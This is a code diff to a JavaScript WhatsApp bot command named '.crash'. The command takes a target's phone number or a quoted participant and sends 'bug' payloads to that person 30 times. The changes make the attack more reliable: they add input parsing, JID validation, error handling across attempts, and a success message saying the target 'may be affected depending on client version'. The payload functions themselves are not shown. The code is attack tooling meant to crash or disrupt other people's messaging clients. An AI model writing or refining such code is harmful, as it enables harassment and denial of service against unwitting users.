@@ -58,21 +58,44 @@ async function crash(sock, chatId, message) {
     const args = parts.slice(1);
 
     let participant;
+    
+    // Try to get participant from quoted message
     if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
       participant = message.message.extendedTextMessage.contextInfo.participant;
-    } else if (args.length > 0) {
-      participant = args[0].replace('@', '') + '@s.whatsapp.net';
-    } else {
-      throw new Error('Specify the person to bug.');
+    } 
+    // Try from command args
+    else if (args.length > 0) {
+      let num = args[0].replace(/[^0-9]/g, '');
+      if (num) {
+        participant = num + '@s.whatsapp.net';
+      } else {
+        throw new Error('Invalid number format. Use: .crash 255711765335 or quote a message.');
+      }
+    } 
+    // Fallback: use chat sender (self-bug in private)
+    else if (chatId && !chatId.includes('@g.us')) {
+      throw new Error('In private chat, quote a message or use: .crash <number>');
+    } 
+    else {
+      throw new Error('Specify the person to bug: .crash <number> or quote a message.');
+    }
+
+    // Validate JID format
+    if (!participant || (typeof participant === 'string' && !participant.includes('@'))) {
+      throw new Error('Invalid participant JID format.');
     }
 
     for (let i = 0; i < 30; i++) {
-      await bugs(message, sock, participant);
-      await bug2(message, sock, participant);
+      try {
+        await bugs(message, sock, participant);
+        await bug2(message, sock, participant);
+      } catch (e) {
+        console.log(`Attempt ${i + 1} failed:`, e.message);
+      }
       await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
-    await sock.sendMessage(chatId, { text: '✅ Target has been bugged successfully' });
+    await sock.sendMessage(chatId, { text: '✅ Bug payload sent 30 times. Target may be affected depending on client version.' });
   } catch (error) {
     console.error('An error occurred while trying to bug the target:', error);
     try {
